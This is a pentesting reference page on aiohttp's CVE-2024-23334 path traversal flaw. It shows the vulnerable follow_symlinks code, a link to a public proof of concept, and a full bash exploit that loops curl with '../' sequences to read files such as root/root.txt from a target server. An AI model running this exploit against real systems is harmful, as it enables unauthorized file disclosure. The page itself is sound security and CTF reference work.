---
description: >-
  Python library that supports both client and server side of HTTP protocol and
  Web-Sockets (asyncio)
icon: globe-pointer
---

# AIOHTTP

{% embed url="https://docs.aiohttp.org/en/stable/index.html" %}
Documentation
{% endembed %}

{% embed url="https://security.snyk.io/package/pip/aiohttp" %}
Vulnerabilities
{% endembed %}

<details>

<summary><mark style="color:red;"><strong><code>CVE-2024-23334 - Path Traversal</code></strong></mark></summary>

{% hint style="info" %}
## <mark style="color:purple;">Versions :</mark> <mark style="color:red;">**`1.0.5 - 3.9.2`**</mark>
{% endhint %}

* <mark style="color:purple;">This vulnerability has been present since the introduction of the</mark> <mark style="color:orange;">**`follow_symlinks`**</mark> <mark style="color:purple;">parameter:</mark>

{% code title="Vulnerable Code" overflow="wrap" %}
```python
pp.router.add_routes([
    web.static("/static", "static/", follow_symlinks=True),  # Remove follow_symlinks to avoid the vulnerability
])
```
{% endcode %}

* [<kbd><mark style="color:orange;">**More information**<mark style="color:orange;"></kbd>](https://security.snyk.io/vuln/SNYK-PYTHON-AIOHTTP-6209406)
* <mark style="color:purple;">Look at the requests or fuzz the site to look for directories leaking static resources.</mark>

{% hint style="info" %}
<mark style="color:red;">**`PoC`**</mark>

{% code overflow="wrap" %}
```bash
git clone https://github.com/z3rObyte/CVE-2024-23334-PoC
```
{% endcode %}

* <mark style="color:purple;">Update the</mark> <mark style="color:orange;">**`URL`**</mark> <mark style="color:purple;">,</mark> <mark style="color:orange;">**`payload`**</mark> <mark style="color:purple;">, and</mark> <mark style="color:orange;">**`file`**</mark> <mark style="color:purple;">variables in the</mark> <mark style="color:orange;">**`PoC`**</mark> <mark style="color:purple;">to match your target:</mark>

{% code title="Example" overflow="wrap" %}
```bash
#!/bin/bash

url="http://localhost:8080"
string="../"
payload="/assets/"
file="root/root.txt" # without the first /

for ((i=0; i<15; i++)); do
   payload+="$string"
   echo "[+] Testing with $payload$file"
   status_code=$(curl --path-as-is -s -o /dev/null -w "%{http_code}" "$url$payload$file")
   echo -e "\tStatus code --> $status_code"

   if [[ $status_code -eq 200 ]]; then
       curl -s --path-as-is "$url$payload$file"
       break
   fi
done
```
{% endcode %}
{% endhint %}

</details>
